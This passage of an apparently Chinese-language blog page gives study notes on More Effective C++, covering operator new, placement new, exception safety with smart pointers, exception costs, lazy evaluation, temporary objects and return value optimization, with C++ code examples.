class="hljs-built_in">size</span>)</span></span>;<br></code></pre></div></td></tr></table></figure><p>返回值类型是void*，因为这个函数返回一个未经处理（raw）的指针，未初始化的内存。就象malloc 一样，operator new 的职责只是分配内存。它对构造函数一无所知。</p><p>当你的编译器遇见这样的语句：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">string</span> *ps = <span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">"Memory Management"</span>);<br></code></pre></div></td></tr></table></figure><p>它生成的代码或多或少与下面的伪代码相似：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">void</span> *memory = <span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">string</span>)); <br><span class="hljs-function">call <span class="hljs-title">string::string</span><span class="hljs-params">(<span class="hljs-string">"Memory Management"</span>)</span> on *memory</span>;<br><span class="hljs-built_in">string</span> *ps = <span class="hljs-keyword">static_cast</span>&lt;<span class="hljs-built_in">string</span>*&gt;(memory);<br></code></pre></div></td></tr></table></figure><h4><span id="placement-new">placement new</span></h4><p>如果被调用的 operator new 除了接受“一定得有的 size_t自变量”之外，还接受了一个 void＊参数，指向一块内存，准备用来接受构造好的对象。这样的operator new 就是placement new。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> * <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span>, <span class="hljs-keyword">void</span> *location)</span></span>;<br></code></pre></div></td></tr></table></figure><h4><span id="总结">总结</span></h4><ul><li>如果你希望将对象产生于 heap，请使用 newoperator。它不但分配内存而且为该对象调用一个constructor。</li><li>如果你只是打算分配内存，请调用 operator new，那就没有任何constructor 会被调用。</li><li>如果你打算在 heap objects 产生时自己决定内存分配方式，请写一个自己的operator new，并使用 new operator，它将会自动调用你所写的 operatornew。</li><li>如果你打算在已分配（并拥有指针）的内存中构造对象，请使用placementnew。</li></ul><h2><span id="三-异常">三、异常</span></h2><p>如果一个函数利用“设定状态变量”的方式或是利用“返回错误码”的方式发出一个异常信号，无法保证此函数的调用者会检查那个变量或检验那个错误码。于是程序的执行可能会一直继续下去，远离错误发生地点。</p><p>但是如果函数以抛出 exception 的方式发出异常信号，而该 exception未被捕捉，程序的执行便会立刻中止。</p><p>如果你需要一个“绝对不会被忽略的”异常信号发射方法，而且发射后的 stack处理过程又能够确保局部对象的 destructors 被调用，那么你需要 C++exceptions。</p><h3><span id="条款-9利用destructors避免泄漏资源"><strong>条款 9：利用destructors避免泄漏资源</strong></span></h3><p>解决办法就是，以一个“类似指针的对象”取代指针。如此一来，当这个类似指针的对象被销毁，我们可以令其destructor 调用delete。“行为类似指针”的对象我们称为 smart pointers。</p><p>C++提供一个名为 auto_ptr 的智能指针。隐藏在 auto_ptr背后的观念是，以一个对象存放“必须自动释放的资源”，并依赖该对象的destructor释放。</p><p>只要坚持这个规则，把资源封装在对象内，通常便可以在 exceptions出现时避免泄漏资源。</p><p>一个 auto_ptr 的实现示例：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt; <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">autoPtr</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">autoPtr</span><span class="hljs-params">(T* p = <span class="hljs-number">0</span>)</span></span>;<br><br>    <span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> U&gt; autoPtr(autoPtr&lt;U&gt;&amp; rhs);<br><br>    ~autoPtr();<br><br>    <span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> U&gt; autoPtr&lt;T&gt;&amp; <span class="hljs-keyword">operator</span>=(autoPtr&lt;U&gt;&amp; rhs);<br><br>    T&amp;   <span class="hljs-keyword">operator</span>*() <span class="hljs-keyword">const</span>;<br>    T*   <span class="hljs-keyword">operator</span>-&gt;() <span class="hljs-keyword">const</span>;<br>    <span class="hljs-function">T*   <span class="hljs-title">get</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span>;<br>    <span class="hljs-function">T*   <span class="hljs-title">release</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">reset</span><span class="hljs-params">(T* p = <span class="hljs-number">0</span>)</span></span>;<br><br><span class="hljs-keyword">private</span>:<br>    T* pointee;<br>    <span class="hljs-comment">// 书上示例代码，这里有个特化模板友元，显然是个错误</span><br>&#125;;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt; autoPtr&lt;T&gt;::autoPtr(T* p) : pointee(p) &#123;&#125;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> U&gt;<br>autoPtr&lt;T&gt;::autoPtr(autoPtr&lt;U&gt;&amp; rhs) : pointee(rhs.<span class="hljs-built_in">release</span>()) &#123;&#125;<br><br><span class="hljs-comment">// operator= 使用 copy and swap 也可</span><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> U&gt;<br>autoPtr&lt;T&gt;&amp; autoPtr&lt;T&gt;::<span class="hljs-keyword">operator</span>=(autoPtr&lt;U&gt;&amp; rhs) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span> != rhs) reset(rhs.<span class="hljs-built_in">release</span>());<br>    <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>&#125;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt; autoPtr&lt;T&gt;::~autoPtr() &#123; <span class="hljs-keyword">delete</span> pointee; &#125;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br>T&amp; autoPtr&lt;T&gt;::<span class="hljs-keyword">operator</span>*() <span class="hljs-keyword">const</span> &#123; <span class="hljs-keyword">return</span> *pointee; &#125;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br>T* autoPtr&lt;T&gt;::<span class="hljs-keyword">operator</span>-&gt;() <span class="hljs-keyword">const</span> &#123; <span class="hljs-keyword">return</span> pointee; &#125;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br>T* autoPtr&lt;T&gt;::<span class="hljs-built_in">get</span>() <span class="hljs-keyword">const</span> &#123; <span class="hljs-keyword">return</span> pointee; &#125;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br>T* autoPtr&lt;T&gt;::<span class="hljs-built_in">release</span>() &#123;<br>    T* oldPointee = pointee;<br>    pointee = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> oldPointee;<br>&#125;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-keyword">void</span> autoPtr&lt;T&gt;::reset(T* p) &#123;<br>    <span class="hljs-keyword">if</span> (pointee != p) &#123;<br>        <span class="hljs-keyword">delete</span> pointee;<br>        pointee = p;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="条款10在-constructors内阻止资源泄漏resource-leak"><strong>条款10：在 constructors内阻止资源泄漏（resource leak）</strong></span></h3><p>C++只能析构被完全构造的对象（fully contructed objects）,只有一个对象的构造函数完全运行完毕，这个对象才被完全地构造。若因为异常导致构造函数没有执行完毕，那么也不会调用析构函数。</p><p>由于C++不自动清理那些“构造期间抛出exceptions”的对象，所以你必须设计你的constructors，使它们能够自我清理。</p><p>通常这只需将所有可能的 exceptions捕捉起来，执行某种清理工作，然后重新抛出exception，使它继续传播出去即可。</p><p>另外，member initializaion list是在构造函数之前进行的，所以可以利用这一点，可以让某系操作在构造函数之前进行，并处理异常。比如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookEntry</span> &#123;</span> <br><span class="hljs-keyword">public</span>: <br>    ...<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-built_in">string</span> theName;<br><span class="hljs-built_in">string</span> theAddress;<br><span class="hljs-built_in">list</span>&lt;PhoneNumber&gt; thePhones; <br>    <span class="hljs-comment">// Image *theImage;</span><br>    <span class="hljs-comment">// AudioClip *theAudioClip;</span><br><span class="hljs-function">Image * <span class="hljs-title">initImage</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span>&amp; imageFileName)</span></span>; <br>    <span class="hljs-function">AudioClip * <span class="hljs-title">initAudioClip</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span>&amp; audioClipFileName)</span></span>;<br>&#125;; <br><br>BookEntry::BookEntry(<span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span>&amp; name, <br>                     <span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span>&amp; address, <br>                     <span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span>&amp; imageFileName, <br>                     <span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span>&amp; audioClipFileName)<br>: theName(name), theAddress(address), <br>theImage(initImage(imageFileName)), <br>theAudioClip(initAudioClip(audioClipFileName))<br>&#123;&#125;<br><br><span class="hljs-comment">// theImage 被首先初始化,所以即使这个初始化失败也 </span><br><span class="hljs-comment">// 不用担心资源泄漏，这个函数不用进行异常处理。</span><br><span class="hljs-function">Image * <span class="hljs-title">BookEntry::initImage</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span>&amp; imageFileName)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (imageFileName != <span class="hljs-string">""</span>) <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Image(imageFileName); <br>    <span class="hljs-keyword">else</span> <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// theAudioClip 被第二个初始化, 所以如果在 theAudioClip </span><br><span class="hljs-comment">// 初始化过程中抛出异常，它必须确保 theImage 的资源被释放。 </span><br><span class="hljs-comment">// 因此这个函数使用 try...catch 。 </span><br><span class="hljs-function">AudioClip * <span class="hljs-title">BookEntry::initAudioClip</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span>&amp;,</span></span><br><span class="hljs-function"><span class="hljs-params">                                     audioClipFileName)</span></span>&#123;<br>    <span class="hljs-keyword">try</span> &#123; <br>        <span class="hljs-keyword">if</span> (audioClipFileName != <span class="hljs-string">""</span>) <br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> AudioClip(audioClipFileName);<br>        <span class="hljs-keyword">else</span> <br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>    &#125; <span class="hljs-keyword">catch</span> (...) &#123;<br><span class="hljs-keyword">delete</span> theImage; <br>        <span class="hljs-keyword">throw</span>;<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>如果你以 auto_ptr 对象来取代 pointer class members，免除了“exceptions出现时发生资源泄漏”的危机，不再需要在 destructors内亲自动手释放资源。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookEntry</span> &#123;</span> <br><span class="hljs-keyword">public</span>: ...<br><span class="hljs-keyword">private</span>: <br>    ...<br><span class="hljs-keyword">const</span> <span class="hljs-built_in">auto_ptr</span>&lt;Image&gt; theImage;<br>    <span class="hljs-keyword">const</span> <span class="hljs-built_in">auto_ptr</span>&lt;AudioClip&gt; theAudioClip; <br>&#125;;<br><br>BookEntry::BookEntry(<span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span>&amp; name, <br>                     <span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span>&amp; address, <br>                     <span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span>&amp; imageFileName, <br>                     <span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span>&amp; audioClipFileName)<br>: theName(name), theAddress(address), <br>theImage(imageFileName != <span class="hljs-string">""</span> ? <span class="hljs-keyword">new</span> Image(imageFileName) : <span class="hljs-number">0</span>),<br>theAudioClip(audioClipFileName != <span class="hljs-string">""</span> ? <span class="hljs-keyword">new</span> AudioClip(audioClipFileName) : <span class="hljs-number">0</span>)<br>&#123;&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="条款11禁止异常exceptions流出destructors之外"><strong>条款11：禁止异常（exceptions）流出destructors之外</strong></span></h3><p>两种情况下 destructor 会被调用。</p><ol type="1"><li>第一种情况是当对象在正常状态下被销毁，也就是当它离开了它的生存空间（scope）或是被明确地删除；</li><li>第二种情况是当对象被 exception 处理机制销毁，也就是exception传播过程中的 stack-unwinding（栈展开）机制。</li></ol><p>如果控制权基于 exception 的因素离开 destructor，而此时正有另一个exception 处于作用状态，C++会调用 terminate函数，将你的程序结束掉，甚至不等局部对象被销毁。</p><p>全力阻止 exceptions 传出 destructors之外：</p><ul><li>第一，它可以避免 terminate 函数在 exception传播过程的栈展开（stack-unwinding）机制中被调用；</li><li>第二，它可以协助确保 destructors 完成其应该完成的所有事情。</li></ul><h3><span id="条款12了解抛出一个exception与传递一个参数或调用一个虚函数之间的差异"><strong>条款12：了解“抛出一个exception”与“传递一个参数”或“调用一个虚函数”之间的差异</strong></span></h3><ol type="1"><li>第一，exception objects 总是会被复制，如果以 by value方式捕捉，它们甚至被复制两次。至于传递给函数参数的对象则不一定得复制。</li><li>第二，“被抛出成为exceptions”的对象，相比于“被传递到函数去”的对象，其合法的类型转换更少。</li><li>第三，catch子句以其“出现于源代码的顺序”被编译器检验比对，其中第一个匹配成功者便执行；而当我们以某对象调用一个虚函数，被选中执行的是那个“与对象类型最佳吻合”的函数，不论它是不是源代码所列的第一个。</li></ol><h3><span id="条款-13以by-reference方式捕捉-exceptions"><strong>条款 13：以by reference方式捕捉 exceptions</strong></span></h3><p>如果 catch by reference，</p><ul><li>可以避开对象删除问题；</li><li>可以避开 exception objects 的切割（slicing）问题；</li><li>可以保留捕捉标准 exceptions 的能力；</li><li>约束了 exception objects 需被复制的次数。</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">try</span> &#123;<br>...<br>&#125; <span class="hljs-keyword">catch</span> (exception&amp; ex) &#123;<br>...<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="条款14明智运用-exception-specification"><strong>条款14：明智运用 exception specification</strong></span></h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f1</span><span class="hljs-params">()</span></span>;  <span class="hljs-comment">// 可以抛出任意的异常</span><br><span class="hljs-comment">// exception specification 声明其只能抛出 int 类型的异常</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f2</span><span class="hljs-params">()</span> <span class="hljs-title">throw</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span> </span>&#123;<br>... <br>f1();  <span class="hljs-comment">// 即使 f1 抛出不是 int 类型的异常，也是合法的</span><br>... <br>&#125;<br></code></pre></div></td></tr></table></figure><p>结论是：</p><ol type="1"><li><p>不应该将 templates 和 exception specifications混合使用。</p></li><li><p>如果A 函数内调用了 B 函数，而 B 函数无 exceptionspecifications，那么 A 函数本身也不要设定exceptionspecifications。</p></li><li><p>处理“系统”可能抛出的exceptions。其中最常见的就是bad_alloc，那是在内存分配失败时由operator new 和 operatornew[]抛出的。</p></li></ol><h3><span id="条款15了解异常处理exception-handling的成本"><strong>条款15：了解异常处理（exception handling）的成本</strong></span></h3><ol type="1"><li>为了能够在运行时期处理exceptions，程序必须做大量记录工作。在每一个执行点，它们必须能够确认“如果发生exception，哪些对象需要析构”，它们必须在每一个 try语句块的进入点和离开点做记号，针对每个 try 语句块它们必须记录对应的catch 子句及能够处理的 exceptions 类型。</li><li>try 语句块，无论何时使用它，都得为此付出代价。不同的编译器实现 try块的方法不同，所以编译器与编译器间的开销也不一样。粗略地估计，如果你使用try 块，代码将膨胀5％－10％并且运行速度也同比例减慢。exceptionspecification 通常也有与 try 块一样多的系统开销。</li><li>如果是因为异常而导致函数返回，函数的执行速度通常会比正常情况下慢 3个数量级。当然，只有在抛出 exception 时才会承受这样的开销。</li></ol><h2><span id="四-效率">四、效率</span></h2><h3><span id="条款-16谨记-80-20法则"><strong>条款 16：谨记 80-20法则</strong></span></h3><p>80-20 法则说：一个程序 80%的资源用于20%的代码身上。是的，80%的执行时间花在大约20%的代码身上，80%的内存被大约 20%的代码使用，80%的磁盘访问动作由20%的代码执行，80%的维护力气花在 20%的代码上面。</p><p>软件的整体性能几乎总是由代码的一小部分决定。</p><h3><span id="条款17考虑使用-lazy-evaluation缓式评估"><strong>条款17：考虑使用 lazy evaluation（缓式评估）</strong></span></h3><p>lazyevaluation（缓式评估）。延缓运算，直到那些运算结果刻不容缓地被迫切需要为止。如果其运算结果一直不被需要，运算也就一直不执行。</p><p>在你真正需要之前，不必着急为某物做一个副本。在某些应用领域，你常有可能永远不需要提供那样一个副本。</p><p>实现 lazy fetching 时，你必须面对一个问题：null 指针可能会在任何member functions（包括const memberfunctions）内被赋值，以指向真正的数据。然而当你企图在 const memberfunctions 内修改 data members，编译器不会同意。除非将指针字段声明为mutable。</p><p>lazy evaluation在许多领域中都可能有用途：可避免非必要的对象复制，可区别 operator[]的读取和写动作，可避免非必要的数据库读取动作，可避免非必要的数值计算动作。</p><h3><span id="条款18分期摊还预期的计算成本"><strong>条款18：分期摊还预期的计算成本</strong></span></h3><p>另一种改善软件性能的方法是：令它超前进度地做“要求以外”的更多工作。该方法可称为超急评估（over-eagerevaluation）：在被要求之前就先把事情了。</p><p>Over-eager evaluation背后的观念是，如果你预期程序常常会用到某个计算，你可以降低每次计算的平均成本，办法就是设计一份数据结构以便能够极有效率地处理需求，比如实时更新max、min等值，当需要使用时直接取值，而不用计算。</p><p>Caching是“分期摊还预期计算之成本”的一种做法，Prefetching（预先取出）则是另一种做法。</p><blockquote><p>这些思想很常见很有用，cache 自不用多说。对于prefetching，比如，prefetch内存数据时，总是按页大小进行成块取数据，局部性原理告诉我们相邻的数据通常会更可能被需要。有时对象太大超过页大小，就会增加换页活动，缓存命中率下降，造成性能损失。</p></blockquote><p>可通过over-eager evaluation，如 caching 和 prefetching等做法分摊预期运算成本，这和 lazy evaluation 并不矛盾。</p><ul><li>当你必须支持某些运算而其结果并不总是需要的时候，lazy evaluation可以改善程序效率。</li><li>当你必须支持某些运算而其结果几乎总是被需要，或其结果常常被多次需要的时候，over-eagerevaluation 可以改善程序效率。</li></ul><h3><span id="条款19了解临时对象的来源"><strong>条款19：了解临时对象的来源</strong></span></h3><p>C++ 临时对象是不可见的，不会在你的源代码中出现。只要你产生一个non-heap object 而没有为它命名，便诞生了一个临时对象。</p><p>这种匿名对象通常发生于两种情况：一是当隐式类型转换（implicit typeconversions）时产生，以求函数调用能够成功；二是当函数返回对象的时候。</p><h4><span id="隐式类型转换">隐式类型转换</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">size_t</span> <span class="hljs-title">countChar</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span>&amp; str, <span class="hljs-keyword">char</span> ch)</span></span>;<br>...<br><span class="hljs-keyword">char</span> <span class="hljs-built_in">buffer</span>[MAX_STRING_LEN];<br><span class="hljs-keyword">char</span> c;<br>...<br><span class="hljs-keyword">int</span> ret = countChar(<span class="hljs-built_in">buffer</span>, c);<br></code></pre></div></td></tr></table></figure><p>看一下 countChar的调用。第一个被传送的参数是字符数组，但是对应函数的正被绑定的参数的类型是 conststring&amp;。仅当消除类型不匹配后，才能成功进行这个调用。</p><p>编译器会建立一个 string 类型的临时对象。通过以 buffer 做为参数调用string 的构造函数来初始化这个临时对象。countChar 的参数 str被绑定在这个临时的 string 对象上。当 countChar返回时，临时对象自动释放。</p><p>仅当通过传值（by value）方式传递对象 或传递常量引用（reference-to-const）参数时，才会发生这些类型转换。当传递一个非常量引用（reference-to-non-const）参数对象，就不会发生。比如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">uppercasify</span><span class="hljs-params">(<span class="hljs-built_in">string</span>&amp; str)</span></span>;<br>...<br><span class="hljs-keyword">char</span> subtleBookPlug[] = <span class="hljs-string">"Effective C++"</span>; <br>uppercasify(subtleBookPlug);<br></code></pre></div></td></tr></table></figure><p>这里假如产生一个临时对象，uppercasify会对string&amp;所指的临时对象进行修改，而不是对subtleBookPlug字符数组进行修改，显然和uppercasify函数设计的本意是不符合的，这显然是一个错误，却不易察觉。</p><p>所以，C++语言禁止为非常量引用（reference-to-non-const）产生临时对象。以上情况并不会发生。</p><h4><span id="函数返回对象">函数返回对象</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">const</span> Number <span class="hljs-keyword">operator</span>+(<span class="hljs-keyword">const</span> Number&amp; lhs, <span class="hljs-keyword">const</span> Number&amp; rhs);<br></code></pre></div></td></tr></table></figure><p>这个函数的返回值是临时的，因为它没有被命名，它只是函数的返回值。你必须为每次调用operator+构造和释放这个对象而付出代价。有时可以通过 返回值优化（return valueoptimization）可以将这个临时对象消灭掉。</p><h4><span id="总结">总结</span></h4><ul><li>任何时候只要你看到一个 reference-to-const参数，就极可能会有一个临时对象被产生出来绑定至该参数上。</li><li>任何时候只要你看到函数返回一个对象，就会产生临时对象（并于稍后销毁）。</li></ul><h3><span id="条款20协助完成返回值优化rvo"><strong>条款20：协助完成“返回值优化（RVO）”</strong></span></h3><p>可以用某种特殊写法来撰写函数，使它在返回对象时，能够让编译器消除临时对象的成本。</p><p>方法是：返回 constructor arguments 以取代对象。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 错误方法</span><br><span class="hljs-keyword">const</span> Rational&amp; <span class="hljs-keyword">operator</span>*(<span class="hljs-keyword">const</span> Rational&amp; lhs, <span class="hljs-keyword">const</span> Rational&amp; rhs) &#123;<br>    <span class="hljs-function">Rational <span class="hljs-title">result</span><span class="hljs-params">(lhs.numerator() * rhs.numerator(), </span></span><br><span class="hljs-function"><span class="hljs-params">                    lhs.denominator() * rhs.denominator())</span></span>;<br><span class="hljs-keyword">return</span> result; <span class="hljs-comment">// 返回时，其指向的对象已经不存在了 </span><br>&#125;<br><br><span class="hljs-comment">// 正确方法</span><br><span class="hljs-keyword">const</span> Rational <span class="hljs-keyword">operator</span>*(<span class="hljs-keyword">const</span> Rational&amp; lhs, <span class="hljs-keyword">const</span> Rational&amp; rhs) &#123;<br><span class="hljs-keyword">return</span> Rational(lhs.numerator() * rhs.numerator(), <br>                    lhs.denominator() * rhs.denominator());<br>&#125;<br></code></pre></div></td></tr></table></figure><p>虽然仍旧必须为在函数内临时对象的构造和释放而付出代价。但是此时，编译器可以进行优化了。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">Rational c = a * b;<br></code></pre></div></td></tr></table></figure><p>编译器会消除在 operator* 内的临时变量和 operator*返回的临时变量。直接在 c 的内存里构造 return 表达式定义的对象。调用operator* 的临时对象的开销就是零：没有建立临时对象。</p><p>利用函数的 return 点消除一个局部临时对象，这种方法很常见，被称之为return value optimization。</p><h3><span id="条款21利用重载技术overload避免隐式类型转换implicit-typeconversion"><strong>条款21：利用重载技术（overload）避免隐式类型转换（implicit typeconversion）</strong></span></h3><p>在重载操作符时，每个重载函数的参数必须至少一个是“用户定制类型”的自变量。如果不是，就会改变C++内部预先定义的操作符意义（参数类型全是内置类型），而那当然会导致天下大乱。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 合理的设计</span><br><span class="hljs-keyword">const</span> UPInt <span class="hljs-keyword">operator</span>+(<span class="hljs-keyword">const</span> UPInt&amp; lhs, <br>                      <span class="hljs-keyword">const</span> UPInt&amp; rhs);<br><span class="hljs-keyword">const</span> UPInt <span class="hljs-keyword">operator</span>+(<span 